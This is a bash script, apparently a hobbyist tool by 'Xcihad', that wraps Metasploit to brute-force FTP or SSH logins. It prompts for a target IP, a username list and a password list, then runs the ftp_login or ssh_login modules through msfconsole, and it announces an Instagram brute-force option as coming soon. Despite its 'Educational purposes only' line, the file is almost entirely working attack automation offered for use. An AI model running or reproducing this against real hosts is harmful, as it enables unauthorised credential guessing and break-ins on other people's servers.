# Boost Software License - Version 1.0 - August 17th, 2003

# Permission is hereby granted, free of charge, to any person or organization
# obtaining a copy of the software and accompanying documentation covered by
# this license (the "Software") to use, reproduce, display, distribute,
# execute, and transmit the Software, and to prepare derivative works of the
# Software, and to permit third-parties to whom the Software is furnished to
# do so, all subject to the following:

# The copyright notices in the Software and this entire statement, including
# the above license grant, this restriction and the following disclaimer,
# must be included in all copies of the Software, in whole or in part, and
# all derivative works of the Software, unless such copies or derivative
# works are solely in the form of machine-executable object code generated by
# a source language processor.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE, TITLE AND NON-INFRINGEMENT. IN NO EVENT
# SHALL THE COPYRIGHT HOLDERS OR ANYONE DISTRIBUTING THE SOFTWARE BE LIABLE
# FOR ANY DAMAGES OR OTHER LIABILITY, WHETHER IN CONTRACT, TORT OR OTHERWISE,
# ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
# DEALINGS IN THE SOFTWARE.

# Educational purposes only
# All rights reserved --> Xcihad ©


#! /bin/bash
# Author : Xcihad

clear

dependencies() {
echo ""
command -v msfconsole > /dev/null 2>&1 || { printf >&2 "$kirmizi Please install metasploit and try again. Aborting."; exit 1; }
if [ $(ls /dev/urandom >/dev/null; echo $?) == "1" ]; then
echo "/dev/urandom not found!"
exit 1
fi

}

kirmizi="\e[31m"
yesil="\e[32m"
sari="\e[33m"
mavi="\e[36m"
mor="\e[34m"
beyaz="\033[1;37m"
reset="\e[0m"
author="\e[33mAuthor : \e[31mX\e[32mcihad \e[31mV1.0\e[0m"

banner(){
dependencies
printf "\n"
printf "\n"
printf "     $mor██████  ██████  ██    ██ ████████ ███████      ██$reset\n"
printf "     $mor██   ██ ██   ██ ██    ██    ██    ██           ██$reset\n"
printf "     $mor██████  ██████  ██    ██    ██    █████        ██$reset\n"
printf "     $mor██   ██ ██   ██ ██    ██    ██    ██      ██   ██$reset\n"
printf "     $mor██████  ██   ██  ██████     ██    ███████  █████ $reset\n"
printf "\n"
printf "\n"
printf "\e[1;77m\e[41m    FTP/SSH Bruteforce attack automation with Metasploit \e[0m\n"
printf "\n"
printf "\n"
printf "     ${author}\n"
printf "\n"
printf "   $kirmizi[\e[32m Updates $kirmizi]$sari IG Bruteforce $mor(Coming soon)\n"
printf "\n"
printf "   $kirmizi[\e[32m1$kirmizi]$sari FTP Bruteforce\n"
printf "   $kirmizi[\e[32m2$kirmizi]$sari SSH Bruteforce\n"
printf "\n"
read -p "$(echo -e $kirmizi[$yesil+$kirmizi]$sari" Enter your choice : "$kirmizi)" cihad
}
banner
if [[ $cihad == 1 || $cihad == 01 ]]; then
        echo ""
        read -p "$(echo -e $kirmizi[$yesil+$kirmizi]$sari" RHOST address : "$kirmizi)" ip
        sleep 1
        printf "\n"
        read -p "$(echo -e $kirmizi[$yesil+$kirmizi]$sari" List of users : "$kirmizi)" listuser
        printf "\n"
        sleep 1
        read -p "$(echo -e $kirmizi[$yesil+$kirmizi]$sari" List of passwords : "$kirmizi) " listpass
        printf "\n"
        printf $" --->$sari Necessary actions are being taken...\n"
        sleep 2
        echo ""
        printf " $kirmizi[$yesil+$kirmizi]$yesil List of users: $listuser\n"
        sleep 1
        printf " $kirmizi[$yesil+$kirmizi]$yesil List of passwords: $listpass\n"
        sleep 2
        clear
        printf "\n"
        printf $" --->$sari Starting attack on $ip address\n"
        printf "\n"
        sleep 3 

        msfconsole -q -x "use auxiliary/scanner/ftp/ftp_login; set RHOSTS $ip ; set USER_FILE $listuser ; set PASS_FILE $listpass ; exploit ; "

elif [[ $cihad == 2 || $cihad == 02 ]]; then
        echo ""
        read -p "$(echo -e $kirmizi[$yesil+$kirmizi]$sari" RHOST address : "$kirmizi)" ip
        sleep 1
        printf "\n"
        read -p "$(echo -e $kirmizi[$yesil+$kirmizi]$sari" List of users : "$kirmizi)" listuser
        printf "\n"
        sleep 1
        read -p "$(echo -e $kirmizi[$yesil+$kirmizi]$sari" List of passwords : "$kirmizi) " listpass
        printf "\n"
        printf $" --->$sari Necessary actions are being taken...\n"
        sleep 2
        echo ""
        printf " $kirmizi[$yesil+$kirmizi]$yesil List of users: $listuser\n"
        sleep 1
        printf " $kirmizi[$yesil+$kirmizi]$yesil List of passwords: $listpass\n"
        sleep 2
        clear
        printf "\n"
        printf $" --->$sari Starting attack on $ip address\n"
        printf "\n"
        sleep 3

msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS $ip ; set USER_FILE $listuser ; set PASS_FILE $listpass ; exploit ; "

else
        printf "\n"
        printf "$beyaz--> $kirmizi Wrong choice !\n"
        sleep 2
        bash brute.sh
fi
